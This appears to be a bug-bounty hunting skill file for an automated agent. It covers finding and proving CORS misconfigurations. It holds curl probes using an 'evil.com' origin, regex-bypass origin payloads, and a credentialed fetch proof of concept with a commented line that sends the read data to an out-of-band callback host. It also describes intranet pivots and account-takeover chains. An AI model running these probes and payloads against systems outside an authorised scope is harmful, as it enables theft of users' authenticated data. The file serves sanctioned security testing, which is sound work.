---
name: hunt-cors
description: "Hunt CORS Misconfiguration — origin-reflection with credentials, null-origin trust, subdomain-regex bypass (unanchored vs unescaped-dot vs prefix-only), pre-flight (OPTIONS) gating bypass, postMessage origin checks. High only when an attacker-controlled origin can perform a CREDENTIALED cross-origin read of sensitive data and you have proven it in a browser. Use when testing API endpoints, SPAs, or any app emitting Access-Control-* headers."
sources: hackerone_public
---

# HUNT-CORS — Cross-Origin Resource Sharing

## Rails
- In-scope only. Browser PoC from **your** origin against **your** logged-in session.
- Read-only reads first. Credentialed writes (preflight PUT/DELETE) only on test objects.
- One proof read (unique marker). No mass exfil.
- STOP at draft. curl header diffs are **leads**, not findings.

## What pays
Attacker origin performs a **credentialed** cross-origin **read of sensitive authed data**, proven in a **real browser**.

Hard browser rules:
- `ACAO: *` **cannot** pair with credentials — browser blocks `credentials: include`. Wildcard-only = Info/Low unless the data is secret **without** a session (rare).
- `ACAC: true` alone is meaningless. Need **your** origin in `ACAO` **and** a readable body.
- **Cookies must actually attach.** Read `Set-Cookie`. Cross-site `fetch(..., {credentials:"include"})` from `https://evil.com` sends the session cookie only if it is `SameSite=None; Secure` (and the browser is still sending third-party cookies). Default `Lax`/`Strict` → the request is anonymous; a 200 JSON body is the logged-out response, **not** a High. Confirm in DevTools that the request includes the session cookie **and** the body contains an authed marker. If the cookie is Lax/Strict, the remaining High path is a **same-site** attacker origin (sibling XSS / takeover) — do not drop the bug, chain it.
- **Bearer-in-JS is not cookie CORS.** If the app attaches `Authorization: Bearer` from `localStorage`, an attacker origin cannot read that storage or steal the victim's header. Reflecting `Origin` on a Bearer-only API is not session theft.

## Decision tree
1. Find endpoints that emit `Access-Control-*` **and** return authed PII/tokens (profile, CSRF token, dumps).
2. Probe Origin: attacker, `null`, scheme/port/trailing-dot variants, regex-class bypasses (Phase 3).
3. If `ACAO` reflects a **registerable** origin you control + `ACAC: true` → **browser PoC** (Phase 5). If fetch throws `BLOCKED`, kill the High.
4. Preflight: arbitrary method/header for that origin → credentialed **write** chain (`hunt-csrf`).
5. postMessage handlers without strict `event.origin` (`hunt-dom`).
6. Trusted `*.target.com` → only a bug if you **control** a matching host (`hunt-subdomain` / XSS on sibling).

## Surface
`/api/me` `/api/profile` `/api/tokens` `/api/csrf` `/graphql` `/api/balance` — anything cookie-authed with secrets in JSON.

## Phase 1–2 — Discover + reflect / null
```bash
curl -sD - -o /dev/null "https://$TARGET/api/me" \
  -H "Origin: https://evil.com" -H "Cookie: $SESSION" | grep -i access-control
curl -sD - -o /dev/null "https://$TARGET/api/me" \
  -H "Origin: null" -H "Cookie: $SESSION" | grep -i access-control
```
**High shape:** `ACAO: https://evil.com` + `ACAC: true`. **Not:** `ACAO: *`.

Also try: `http://` on an `https` API (scheme), `https://target.com:443` vs `:444`, `https://target.com.` (trailing dot), `https://evil.com/` (path in Origin is invalid — some parsers still reflect).

## Phase 3 — Regex class → matching payload
Identify the **flaw**, then send **that** origin. Wrong payload = false negative.

| Intended `*.target.com` regex | Flaw | Bypass origin |
|---|---|---|
| `^https?://.*\.target\.com$` escaped + `$` | None | Only takeover/XSS on a real sibling |
| `^https?://.*target\.com$` | Missing `\.` | `https://eviltarget.com` |
| `^https?://.*\.target\.com` no `$` | Unanchored | `https://x.target.com.evil.com` |
| `^https?://target\.com` no `$` | Prefix | `https://target.com.evil.com` |
| Unescaped `.` | Any char | `https://xtargetXcom` |
| Special Origin bytes | Parser | `` https://target.com%60.evil.com `` — only if a **browser** sends it |

`evil.target.com` reflecting is **in-policy** unless you control it.

## Phase 4 — Preflight vs actual
OPTIONS may lie. Test GET/POST **and** OPTIONS. Browser enforces CORS; curl does not.

```bash
curl -sD - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: content-type, x-csrf" | grep -i access-control
```

**Private Network Access (Chrome):** a private-network request from a secure public context triggers a preflight carrying `Access-Control-Request-Private-Network: true`. If an internal app reflects attacker origin + returns `Access-Control-Allow-Private-Network: true` (with a non-wildcard `ACAO` and `ACAC: true` for credentialed reach), a public page can reach RFC1918/localhost APIs. Note PNA **preflight enforcement is on hold** (paused Oct 2024) — only the secure-context restriction is live, so Chrome does not yet *block* on a missing allow header; the server reflecting the allow header is still the proof of intended cross-network exposure. Browser PoC from a public origin; do not scan the LAN beyond one proof.

## Phase 5 — Browser PoCs (mandatory for High)
```html
<script>
fetch("https://TARGET/api/me", {credentials:"include"})
  .then(r => r.text())
  .then(d => {
    document.body.textContent = d; // must show unique authed marker
    // fetch("https://UNIQUE.oastify.com/?d="+encodeURIComponent(d));
  })
  .catch(e => document.body.textContent = "BLOCKED "+e);
</script>
```
Null origin: sandboxed iframe **without** `allow-same-origin` (`Origin: null`). Host 5a on a regex-matched origin you control for Phase 3/takeover.

**Fetch Metadata:** `Sec-Fetch-Site: cross-site` — if the API rejects it, CORS read may still work from `<script>` vs `fetch`; test both. Server ignoring Fetch Metadata is not a CORS bug by itself.

## Phase 6 — postMessage
```bash
grep -rEn "addEventListener\\(['\"]message" --include='*.js' .
```
Weak: `indexOf("target.com")`, `endsWith("target.com")`, `startsWith("https://target")`, no check. Impact is DOM (`hunt-dom`), not ACAO.

## Validation
- Browser: authed **body** readable (screenshot/console) **or** OOB with unique marker. DevTools must show the **session cookie on the cross-origin request**. `BLOCKED` or a logged-out body = no finding.
- A secret that exists only in a response header is readable in the browser only if `Access-Control-Expose-Headers` lists it. curl showing the header is not the bug.
- `Cross-Origin-Resource-Policy: same-origin` (or COEP) can block the read even when `ACAO` reflects your origin. Browser failure means it is not High.
- Sensitive data (PII, session, CSRF, funds) — not `/api/health`.
- Match regex class to payload.
- `ACAO: *` + creds = not exploitable.

**Severity:** reflected origin + creds + sensitive, browser-proven = **High**. Preflight write on sensitive action = **High**. Null-origin same = **Medium–High**. Takeover-assisted = **High/Critical**. Wildcard only = **Info**.

## Chains
| Finding | Compose | Impact |
|---|---|---|
| Creds CORS on `/api/me` | Token/CSRF in body | ATO / CSRF (`hunt-csrf`, `hunt-ato`) |
| Trusted sibling XSS | Host PoC there | Reliable read |
| Dangling trusted host | `hunt-subdomain` | Full read |
| PNA allow | Internal admin API | Intranet pivot |
| ACAO reflects + no `Vary: Origin` | `hunt-cache-poison` | Cached authed body served to others |
| postMessage loose | `hunt-dom` | XSS / client auth |

Cross-refs: `hunt-csrf`, `hunt-subdomain`, `hunt-xss`, `hunt-dom`, `hunt-cache-poison`, `triage-validation`.

## Dedup gate
```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```
`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
